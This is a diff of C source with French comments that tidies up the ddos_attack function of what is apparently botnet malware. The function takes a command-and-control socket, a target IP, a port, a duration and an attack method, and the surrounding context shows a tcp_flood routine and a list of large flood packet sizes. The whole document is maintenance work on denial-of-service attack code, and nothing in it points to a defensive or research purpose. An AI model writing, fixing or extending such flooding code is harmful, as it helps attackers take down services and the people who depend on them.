@@ -1,8 +1,7 @@
 /* Définitions nécessaires pour la compilation croisée */
 #define _GNU_SOURCE
+#define _DEFAULT_SOURCE
 #define __USE_GNU
-#define _BSD_SOURCE
-#define __USE_MISC
 
 /* Configuration */
 #define BUFFER_SIZE 1024
@@ -219,17 +218,21 @@ void tcp_flood(char* target, int port, int duration) {
 
 void ddos_attack(int c2_socket, char* target, int port, int duration, char* method) {
     struct sockaddr_in target_addr;
+    char message[BUFFER_SIZE];
+    char* attack_packet = NULL;
+    int packet_size = 0;
+    int sock;
+    time_t start_time;
+    
+    // Initialisation
+    memset(&target_addr, 0, sizeof(target_addr));
     target_addr.sin_family = AF_INET;
     target_addr.sin_port = htons(port);
     target_addr.sin_addr.s_addr = inet_addr(target);
-    time_t start_time = time(NULL);
-    int sock;
-    char message[BUFFER_SIZE];
-
+    start_time = time(NULL);
+    
     // Tailles des paquets pour les attaques
     int packet_sizes[] = {MAX_PACKET_SIZE, 512*1024, 64*1024, MIN_PACKET_SIZE};
-    int packet_size = 0;
-    char* attack_packet = NULL;
     
     for (int i = 0; i < sizeof(packet_sizes)/sizeof(int); i++) {
         packet_size = packet_sizes[i];
